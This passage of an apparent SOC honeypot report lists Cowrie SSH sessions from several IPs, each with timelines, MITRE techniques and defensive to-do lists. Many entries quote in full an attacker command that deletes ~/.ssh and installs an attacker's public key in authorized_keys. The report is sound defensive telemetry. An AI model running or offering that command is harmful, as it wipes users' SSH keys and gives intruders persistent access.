- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0d082bdb1eb

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 10:07 |
| **Last Seen** | 2026-06-09 10:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:07:27` | `cowrie.session.connect` |
| `2026-06-09 10:07:27` | `cowrie.client.version` |
| `2026-06-09 10:07:27` | `cowrie.client.kex` |
| `2026-06-09 10:07:28` | `cowrie.login.success` |
| `2026-06-09 10:07:28` | `cowrie.session.params` |
| `2026-06-09 10:07:28` | `cowrie.command.input` |
| `2026-06-09 10:07:28` | `cowrie.command.failed` |
| `2026-06-09 10:07:28` | `cowrie.log.closed` |
| `2026-06-09 10:07:28` | `cowrie.session.params` |
| `2026-06-09 10:07:28` | `cowrie.command.input` |
| `2026-06-09 10:07:28` | `cowrie.session.file_download` |
| `2026-06-09 10:07:28` | `cowrie.log.closed` |
| `2026-06-09 10:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c6682db06e0

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 10:07 |
| **Last Seen** | 2026-06-09 10:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:07:30` | `cowrie.session.connect` |
| `2026-06-09 10:07:30` | `cowrie.client.version` |
| `2026-06-09 10:07:30` | `cowrie.client.kex` |
| `2026-06-09 10:07:31` | `cowrie.login.success` |
| `2026-06-09 10:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1dbe3c4258c

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 10:09 |
| **Last Seen** | 2026-06-09 10:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:09:04` | `cowrie.session.connect` |
| `2026-06-09 10:09:04` | `cowrie.client.version` |
| `2026-06-09 10:09:04` | `cowrie.client.kex` |
| `2026-06-09 10:09:06` | `cowrie.login.success` |
| `2026-06-09 10:09:06` | `cowrie.session.params` |
| `2026-06-09 10:09:06` | `cowrie.command.input` |
| `2026-06-09 10:09:06` | `cowrie.command.failed` |
| `2026-06-09 10:09:07` | `cowrie.log.closed` |
| `2026-06-09 10:09:07` | `cowrie.session.params` |
| `2026-06-09 10:09:07` | `cowrie.command.input` |
| `2026-06-09 10:09:08` | `cowrie.session.file_download` |
| `2026-06-09 10:09:08` | `cowrie.log.closed` |
| `2026-06-09 10:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99af1550e720

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 10:09 |
| **Last Seen** | 2026-06-09 10:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:09:11` | `cowrie.session.connect` |
| `2026-06-09 10:09:11` | `cowrie.client.version` |
| `2026-06-09 10:09:12` | `cowrie.client.kex` |
| `2026-06-09 10:09:13` | `cowrie.login.success` |
| `2026-06-09 10:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4811c0ea63fd

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 10:15 |
| **Last Seen** | 2026-06-09 10:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:15:34` | `cowrie.session.connect` |
| `2026-06-09 10:15:34` | `cowrie.client.version` |
| `2026-06-09 10:15:35` | `cowrie.client.kex` |
| `2026-06-09 10:15:36` | `cowrie.login.success` |
| `2026-06-09 10:15:37` | `cowrie.session.params` |
| `2026-06-09 10:15:37` | `cowrie.command.input` |
| `2026-06-09 10:15:37` | `cowrie.command.failed` |
| `2026-06-09 10:15:37` | `cowrie.log.closed` |
| `2026-06-09 10:15:38` | `cowrie.session.params` |
| `2026-06-09 10:15:38` | `cowrie.command.input` |
| `2026-06-09 10:15:38` | `cowrie.session.file_download` |
| `2026-06-09 10:15:38` | `cowrie.log.closed` |
| `2026-06-09 10:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-035ba5960728

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 10:15 |
| **Last Seen** | 2026-06-09 10:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:15:42` | `cowrie.session.connect` |
| `2026-06-09 10:15:42` | `cowrie.client.version` |
| `2026-06-09 10:15:42` | `cowrie.client.kex` |
| `2026-06-09 10:15:43` | `cowrie.login.success` |
| `2026-06-09 10:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2650688c064d

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-06-09 10:23 |
| **Last Seen** | 2026-06-09 10:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:23:04` | `cowrie.session.connect` |
| `2026-06-09 10:23:04` | `cowrie.client.version` |
| `2026-06-09 10:23:04` | `cowrie.client.kex` |
| `2026-06-09 10:23:04` | `cowrie.login.success` |
| `2026-06-09 10:23:04` | `cowrie.session.params` |
| `2026-06-09 10:23:04` | `cowrie.command.input` |
| `2026-06-09 10:23:04` | `cowrie.command.failed` |
| `2026-06-09 10:23:04` | `cowrie.log.closed` |
| `2026-06-09 10:23:05` | `cowrie.session.params` |
| `2026-06-09 10:23:05` | `cowrie.command.input` |
| `2026-06-09 10:23:05` | `cowrie.session.file_download` |
| `2026-06-09 10:23:05` | `cowrie.log.closed` |
| `2026-06-09 10:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-252b2fe850d1

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-06-09 10:23 |
| **Last Seen** | 2026-06-09 10:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:23:06` | `cowrie.session.connect` |
| `2026-06-09 10:23:06` | `cowrie.client.version` |
| `2026-06-09 10:23:06` | `cowrie.client.kex` |
| `2026-06-09 10:23:07` | `cowrie.login.success` |
| `2026-06-09 10:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db856806e365

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 10:35 |
| **Last Seen** | 2026-06-09 10:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:35:51` | `cowrie.session.connect` |
| `2026-06-09 10:35:51` | `cowrie.client.version` |
| `2026-06-09 10:35:51` | `cowrie.client.kex` |
| `2026-06-09 10:35:51` | `cowrie.login.success` |
| `2026-06-09 10:35:52` | `cowrie.session.params` |
| `2026-06-09 10:35:52` | `cowrie.command.input` |
| `2026-06-09 10:35:52` | `cowrie.command.failed` |
| `2026-06-09 10:35:52` | `cowrie.log.closed` |
| `2026-06-09 10:35:52` | `cowrie.session.params` |
| `2026-06-09 10:35:52` | `cowrie.command.input` |
| `2026-06-09 10:35:52` | `cowrie.session.file_download` |
| `2026-06-09 10:35:52` | `cowrie.log.closed` |
| `2026-06-09 10:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebfed6c25ded

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 10:35 |
| **Last Seen** | 2026-06-09 10:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:35:53` | `cowrie.session.connect` |
| `2026-06-09 10:35:53` | `cowrie.client.version` |
| `2026-06-09 10:35:54` | `cowrie.client.kex` |
| `2026-06-09 10:35:54` | `cowrie.login.success` |
| `2026-06-09 10:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3babcc0ad9d

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 10:38 |
| **Last Seen** | 2026-06-09 10:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:38:27` | `cowrie.session.connect` |
| `2026-06-09 10:38:27` | `cowrie.client.version` |
| `2026-06-09 10:38:27` | `cowrie.client.kex` |
| `2026-06-09 10:38:27` | `cowrie.login.success` |
| `2026-06-09 10:38:27` | `cowrie.session.params` |
| `2026-06-09 10:38:27` | `cowrie.command.input` |
| `2026-06-09 10:38:27` | `cowrie.command.failed` |
| `2026-06-09 10:38:27` | `cowrie.log.closed` |
| `2026-06-09 10:38:27` | `cowrie.session.params` |
| `2026-06-09 10:38:27` | `cowrie.command.input` |
| `2026-06-09 10:38:27` | `cowrie.session.file_download` |
| `2026-06-09 10:38:27` | `cowrie.log.closed` |
| `2026-06-09 10:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e9977769698

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 10:38 |
| **Last Seen** | 2026-06-09 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:38:29` | `cowrie.session.connect` |
| `2026-06-09 10:38:29` | `cowrie.client.version` |
| `2026-06-09 10:38:29` | `cowrie.client.kex` |
| `2026-06-09 10:38:29` | `cowrie.login.success` |
| `2026-06-09 10:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d8ea72cd51

| Field | Detail |
|---|---|
| **Source IP** | `101.96.203[.]55` |
| **First Seen** | 2026-06-09 10:47 |
| **Last Seen** | 2026-06-09 10:52 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:47:25` | `cowrie.session.connect` |
| `2026-06-09 10:47:25` | `cowrie.client.version` |
| `2026-06-09 10:47:26` | `cowrie.client.kex` |
| `2026-06-09 10:47:26` | `cowrie.login.success` |
| `2026-06-09 10:52:26` | `cowrie.session.file_upload` |
| `2026-06-09 10:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.203[.]55` to AbuseIPDB if not already reported
- [ ] Block `101.96.203[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfe0201a2302

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 10:51 |
| **Last Seen** | 2026-06-09 10:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:51:54` | `cowrie.session.connect` |
| `2026-06-09 10:51:54` | `cowrie.client.version` |
| `2026-06-09 10:51:55` | `cowrie.client.kex` |
| `2026-06-09 10:51:55` | `cowrie.login.success` |
| `2026-06-09 10:51:55` | `cowrie.session.params` |
| `2026-06-09 10:51:55` | `cowrie.command.input` |
| `2026-06-09 10:51:55` | `cowrie.command.failed` |
| `2026-06-09 10:51:55` | `cowrie.log.closed` |
| `2026-06-09 10:51:55` | `cowrie.session.params` |
| `2026-06-09 10:51:55` | `cowrie.command.input` |
| `2026-06-09 10:51:55` | `cowrie.session.file_download` |
| `2026-06-09 10:51:55` | `cowrie.log.closed` |
| `2026-06-09 10:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b606fca5bdc4

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 10:51 |
| **Last Seen** | 2026-06-09 10:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:51:57` | `cowrie.session.connect` |
| `2026-06-09 10:51:57` | `cowrie.client.version` |
| `2026-06-09 10:51:57` | `cowrie.client.kex` |
| `2026-06-09 10:51:57` | `cowrie.login.success` |
| `2026-06-09 10:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5347837b7de4

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:08 |
| **Last Seen** | 2026-06-09 11:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:08:29` | `cowrie.session.connect` |
| `2026-06-09 11:08:29` | `cowrie.client.version` |
| `2026-06-09 11:08:29` | `cowrie.client.kex` |
| `2026-06-09 11:08:29` | `cowrie.login.success` |
| `2026-06-09 11:08:29` | `cowrie.session.params` |
| `2026-06-09 11:08:29` | `cowrie.command.input` |
| `2026-06-09 11:08:29` | `cowrie.command.failed` |
| `2026-06-09 11:08:30` | `cowrie.log.closed` |
| `2026-06-09 11:08:30` | `cowrie.session.params` |
| `2026-06-09 11:08:30` | `cowrie.command.input` |
| `2026-06-09 11:08:30` | `cowrie.session.file_download` |
| `2026-06-09 11:08:30` | `cowrie.log.closed` |
| `2026-06-09 11:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff6a05ab1d9

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:08 |
| **Last Seen** | 2026-06-09 11:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:08:31` | `cowrie.session.connect` |
| `2026-06-09 11:08:31` | `cowrie.client.version` |
| `2026-06-09 11:08:31` | `cowrie.client.kex` |
| `2026-06-09 11:08:32` | `cowrie.login.success` |
| `2026-06-09 11:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c026ce14a44

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:11 |
| **Last Seen** | 2026-06-09 11:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
